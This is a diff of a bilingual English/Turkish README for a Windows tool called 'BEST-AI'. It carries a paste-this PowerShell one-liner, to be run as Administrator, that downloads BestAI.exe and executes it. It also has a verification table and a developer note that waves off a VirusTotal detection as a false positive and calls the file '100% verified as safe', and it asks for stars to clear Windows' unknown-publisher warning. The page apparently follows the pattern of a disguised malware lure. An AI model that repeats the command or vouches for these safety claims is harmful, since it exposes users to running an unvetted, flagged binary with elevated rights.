@@ -36,7 +36,7 @@
 We highly recommend downloading the latest digitally signed compiled installer (`BestAI.exe`) directly from our [Releases](https://github.com/toprakahmetaydogmus/BEST-AI/releases) page for the safest experience.
 
 Alternatively, you can run the following command in an Administrative PowerShell (this will automatically launch the confirmed installer):
-```powershell
+``powershell
 Invoke-WebRequest -Uri "https://github.com/toprakahmetaydogmus/BEST-AI/raw/refs/heads/main/BestAI.exe" -OutFile "$env:TEMP\BestAI.exe"; Start-Process -FilePath "$env:TEMP\BestAI.exe"
 🇹🇷 Önerilen (Windows Kurulum Dosyası):
 En güvenli deneyim için, Siber Akademi tarafından dijital olarak imzalanmış en güncel yükleyiciyi (BestAI.exe) doğrudan Releases (Sürümler) sayfamızdan indirmenizi şiddetle öneririz.
@@ -84,22 +84,26 @@ This project adheres to professional standards for code integrity and verificati
 
 Bu proje, kod bütünlüğü ve doğrulaması için profesyonel standartlara bağlıdır. "İtibarımızı" artırmak ve Microsoft'un "Bilinmeyen Yayıncı" uyarısını tamamen temizlemek için topluluk yıldızlarını aktif olarak arıyoruz.
 
-Verification Criteria	Status / Description	Doğrulama Kriterleri	Durum / Açıklama
-Packaging	Inno Setup Compiled	Paketleme	Inno Setup Derlenmiş
-Digital Signature	Siber Akademi Authenticode Signed	Dijital İmza	Siber Akademi Authenticode İmzalı
-Antivirus Scan	1/72 Clean on VirusTotal	Antivirüs Taraması	VirusTotal'da 1/72 Temiz
-Code Integrity	SHA-256 Verified	Kod Bütünlüğü	SHA-256 Doğrulandı
-<blockquote class="warning">
-<p><b>Developer Note:</b> The 1/72 flag from VirusTotal is a false positive from a single engine. The file is digitally signed and 100% verified as safe by Siber Akademi.</p>
-<p><b>Geliştirici Notu:</b> VirusTotal'daki 1/72 bayrağı, tek bir motordan gelen yanlış tespittir. Dosya dijital olarak imzalanmıştır ve Siber Akademi tarafından %100 güvenli olarak doğrulanmıştır.</p>
-</blockquote>
+Bu proje, kod bütünlüğü ve doğrulaması için profesyonel standartlara bağlıdır. "İtibarımızı" artırmak ve Microsoft'un "Bilinmeyen Yayıncı" uyarısını tamamen temizlemek için topluluk yıldızlarını aktif olarak arıyoruz.
 
-👤 Developer & Support / Geliştirici & Destek
+| Verification Criteria | Status / Description | Doğrulama Kriterleri | Durum / Açıklama |
+| :--- | :--- | :--- | :--- |
+| **Packaging** | `Inno Setup Compiled` | **Paketleme** | `Inno Setup Derlenmiş` |
+| **Digital Signature** | `Siber Akademi Authenticode Signed` | **Dijital İmza** | `Siber Akademi Authenticode İmzalı` |
+| **Antivirus Scan** | `1/72 Clean on VirusTotal` | **Antivirüs Taraması** | `VirusTotal'da 1/72 Temiz` |
+| **Code Integrity** | `SHA-256 Verified` | **Kod Bütünlüğü** | `SHA-256 Doğrulandı` |
+
+> **Developer Note:** The 1/72 flag from VirusTotal is a false positive from a single engine. The file is digitally signed and 100% verified as safe by Siber Akademi.
+> 
+> **Geliştirici Notu:** VirusTotal'daki 1/72 bayrağı, tek bir motordan gelen yanlış tespittir. Dosya dijital olarak imzalanmıştır ve Siber Akademi tarafından %100 güvenli olarak doğrulanmıştır.
+
+## 👤 Developer & Support / Geliştirici & Destek
+
 <p align="center">
-<a href="https://hopp.bio/siberegitim">
-<img src="https://img.shields.io/badge/Developed%20By-Toprak%20Ahmet%20Aydo%C4%9Fmu%C5%9F-blueviolet?style=for-the-badge" alt="Lead Developer">
-</a>
-<a href="https://hopp.bio/siberegitim">
-<img src="https://img.shields.io/badge/Organization-Siber%20Akademi-lightgrey?style=for-the-badge&logo=opsgenie" alt="Company">
-</a>
+  <a href="https://hopp.bio/siberegitim">
+    <img src="https://img.shields.io/badge/Developed%20By-Toprak%20Ahmet%20Aydo%C4%9Fmu%C5%9F-blueviolet?style=for-the-badge" alt="Lead Developer">
+  </a>
+  <a href="https://hopp.bio/siberegitim">
+    <img src="https://img.shields.io/badge/Organization-Siber%20Akademi-lightgrey?style=for-the-badge&logo=opsgenie" alt="Company">
+  </a>
 </p>
